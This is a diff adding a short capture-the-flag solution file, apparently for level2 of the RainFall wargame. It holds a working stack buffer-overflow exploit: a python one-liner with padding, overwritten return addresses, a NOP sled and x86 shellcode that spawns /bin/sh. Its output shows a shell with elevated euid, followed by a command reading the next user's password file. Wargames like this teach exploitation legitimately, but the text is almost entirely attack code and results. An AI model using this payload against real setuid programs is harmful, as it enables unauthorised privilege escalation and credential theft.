@@ -1,0 +1,13 @@
+ROP 
+
+level2@RainFall:~$    python -c 'print "A"*80 + 
+				"\x08\x04\x85\x3e"[::-1] + 
+				"\xbf\xff\xf7\x64"[::-1] + 
+				"\x90"*10 + 
+				"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' 
+				| ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>�AAAAAAAAAAAA>�d�������������1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+
+$ id 
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+cat /home/user/level3/.pass
